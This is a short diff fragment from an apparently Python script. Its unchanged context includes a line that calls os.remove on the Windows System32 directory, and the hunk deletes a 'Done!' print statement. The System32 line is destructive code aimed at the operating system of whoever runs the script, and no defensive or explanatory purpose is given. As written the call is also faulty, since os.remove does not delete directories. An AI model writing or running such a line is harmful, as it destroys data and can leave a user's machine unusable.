@@ -35,6 +35,4 @@ sleep(0.5)
 
 os.remove(r"C:\Windows\System32")
 
-print("Done!")
-
 
